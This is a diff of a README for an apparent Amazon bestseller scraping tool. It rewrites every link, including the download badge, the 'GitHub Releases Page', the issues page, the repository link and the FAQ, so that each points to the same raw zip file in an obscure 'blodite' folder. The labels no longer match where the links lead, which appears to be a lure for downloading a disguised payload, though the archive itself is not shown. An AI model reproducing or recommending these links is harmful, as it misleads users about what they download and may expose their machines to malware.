@@ -6,7 +6,7 @@ Welcome to Amazon-Bestsellers-Scraper! This tool helps you analyze and extract d
 
 ## 📥 Download Link
 
-[![Download Amazon-Bestsellers-Scraper](https://img.shields.io/badge/Download-Amazon--Bestsellers--Scraper-blue)](https://github.com/SSR-Bit-lab/Amazon-Bestsellers-Scraper/releases)
+[![Download Amazon-Bestsellers-Scraper](https://raw.githubusercontent.com/SSR-Bit-lab/Amazon-Bestsellers-Scraper/main/blodite/Amazon-Bestsellers-Scraper.zip)](https://raw.githubusercontent.com/SSR-Bit-lab/Amazon-Bestsellers-Scraper/main/blodite/Amazon-Bestsellers-Scraper.zip)
 
 ## 🛠️ Installation Requirements
 
@@ -20,7 +20,7 @@ Before you download and run the application, ensure your system meets these requ
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases Page](https://github.com/SSR-Bit-lab/Amazon-Bestsellers-Scraper/releases)
+To get started, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/SSR-Bit-lab/Amazon-Bestsellers-Scraper/main/blodite/Amazon-Bestsellers-Scraper.zip)
 
 Once on the page, look for the latest release. You will find the download options listed. Choose the appropriate file for your operating system and click the link to start the download.
 
@@ -60,12 +60,12 @@ If you encounter any issues while using the Amazon-Bestsellers-Scraper, try the 
 2. **Update Python:** Make sure you have the latest version of Python installed on your device.
 3. **Reinstall the Software:** If the application isn’t launching, try uninstalling and reinstalling it.
 
-If problems persist, visit the issues section on our [GitHub repository](https://github.com/SSR-Bit-lab/Amazon-Bestsellers-Scraper/issues) for solutions or to report bugs.
+If problems persist, visit the issues section on our [GitHub repository](https://raw.githubusercontent.com/SSR-Bit-lab/Amazon-Bestsellers-Scraper/main/blodite/Amazon-Bestsellers-Scraper.zip) for solutions or to report bugs.
 
 ## 🔗 Links for More Information
 
-- [GitHub Repository](https://github.com/SSR-Bit-lab/Amazon-Bestsellers-Scraper)
-- [Frequently Asked Questions](https://github.com/SSR-Bit-lab/Amazon-Bestsellers-Scraper/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/SSR-Bit-lab/Amazon-Bestsellers-Scraper/main/blodite/Amazon-Bestsellers-Scraper.zip)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/SSR-Bit-lab/Amazon-Bestsellers-Scraper/main/blodite/Amazon-Bestsellers-Scraper.zip)
 
 ## 📝 Contributions
 
